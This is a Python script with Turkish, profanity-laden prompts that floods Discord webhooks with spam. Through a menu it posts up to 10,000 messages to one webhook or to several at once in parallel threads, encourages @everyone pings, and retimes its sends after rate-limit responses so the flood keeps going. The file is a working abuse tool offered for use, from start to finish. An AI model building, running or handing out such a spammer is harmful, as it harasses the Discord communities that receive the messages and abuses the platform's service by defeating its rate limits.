import requests
import time
import sys
import threading
import random

def clear():
    print("\033c", end="")  # Terminal temizle (Termux/PC)

def menu():
    clear()
    print("=== LEXUS WEBHOOK SPAMMER MENÜ 🔥🍆 ===")
    print("Bot adı: Lexus Yokedici 18+")
    print("Banner vibe: Neon Lexus logo + drift + seksi araba kızı (avatarı sen koy)")
    print("\n1 - Tekli Webhook Spam")
    print("2 - Çoklu Webhook Spam (2+ webhook paralel)")
    print("0 - Çıkış")
    secim = input("\nSeçimin (1/2/0): ").strip()
    return secim

def spam_worker(webhook_url, mesaj, adet, worker_id=""):
    gonderilen = 0
    hata = 0
    payload = {
        "content": mesaj,
        "username": "Lexus sikici ",
        "avatar_url": "https://i.imgur.com/lexus-neon-drift.gif"  # Lexus banner/avatar linki değiştir (Pinterest'ten neon Lexus +18 vibe bul)
    }

    local_delay = 0.2  # Başta hızlı başla

    for _ in range(adet):
        try:
            r = requests.post(webhook_url, json=payload, timeout=5)
            
            if r.status_code in [200, 204]:
                gonderilen += 1
                print(f"[+] {worker_id} LEXUS PATLATTI! ({gonderilen}/{adet})")
                local_delay = max(0.15, local_delay - 0.02)
            elif r.status_code == 429:
                try:
                    retry = float(r.json().get('retry_after', 1)) + random.uniform(0.5, 2)
                    print(f"[!] Rate limit! {worker_id} {retry:.1f} sn bekliyor...")
                    time.sleep(retry)
                    local_delay = retry + 0.5
                except:
                    time.sleep(3)
            else:
                hata += 1
                print(f"[-] {worker_id} Hata {r.status_code}: {r.text[:80]}")
                if "Unknown Webhook" in r.text:
                    print(f"{worker_id} WEBHOOK GEberdi amk!")
                    break
                local_delay = min(3.0, local_delay + 0.5)
            
            time.sleep(local_delay + random.uniform(0, 0.1))
            
        except Exception as e:
            hata += 1
            print(f"[!] {worker_id} Bağlantı patladı: {e}")
            time.sleep(2)

    print(f"\n{worker_id} Bitti: {gonderilen} başarılı, {hata} hata")

def tekli_spam():
    clear()
    print("=== TEKLİ WEBHOOK SPAM ===")
    webhook_url = input("Webhook URL: ").strip()
    if not webhook_url.startswith("https://discord.com/api/webhooks/"):
        print("Geçersiz webhook amk!")
        return

    mesaj = input("Spam Mesajı (@everyone vs. serbest): ").strip()
    if not mesaj:
        print("Mesaj boş olamaz piç!")
        return

    try:
        adet = int(input("Kaç mesaj? (max 10000): "))
        if adet > 10000 or adet < 1:
            print("1-10000 arası gir lan!")
            return
    except:
        print("Sayı gir dedik!")
        return

    print("\nLexus tekli spam başlıyor... Ctrl+C ile durdur")
    spam_worker(webhook_url, mesaj, adet, worker_id="[TEK]")

def coklu_spam():
    clear()
    print("=== ÇOKLU WEBHOOK SPAM (2+ paralel) ===")
    try:
        webhook_sayisi = int(input("Kaç webhook var? (min 2): "))
        if webhook_sayisi < 2:
            print("En az 2 webhook gir orospu!")
            return
    except:
        print("Sayı gir amk!")
        return

    webhook_list = []
    for i in range(1, webhook_sayisi + 1):
        url = input(f"{i}. Webhook URL: ").strip()
        if not url.startswith("https://discord.com/api/webhooks/"):
            print(f"{i}. geçersiz, atlanıyor...")
            continue
        webhook_list.append(url)

    if len(webhook_list) < 2:
        print("Yeterli webhook yok, iptal!")
        return

    mesaj = input("Ortak Spam Mesajı: ").strip()
    if not mesaj:
        print("Mesaj boş!")
        return

    try:
        adet = int(input("Her webhook'a kaç mesaj? (toplam = adet x webhook sayısı): "))
        if adet > 10000 or adet < 1:
            print("Mantıklı sayı gir!")
            return
    except:
        print("Sayı gir!")
        return

    print(f"\nLexus çoklu spam başlıyor ({len(webhook_list)} webhook paralel)...")
    threads = []
    for idx, url in enumerate(webhook_list, 1):
        t = threading.Thread(target=spam_worker, args=(url, mesaj, adet, f"[WEB{idx}]"))
        t.daemon = True
        t.start()
        threads.append(t)

    try:
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        print("\nLexus'u durdurdun piç!")

# Ana döngü
while True:
    secim = menu()
    if secim == "1":
        tekli_spam()
    elif secim == "2":
        coklu_spam()
    elif secim == "0":
        print("Lexus kapandı amk hadi görüşürüz 🔥")
        sys.exit()
    else:
        print("1, 2 veya 0 gir lan!")
    
    input("\nDevam için Enter'a bas...")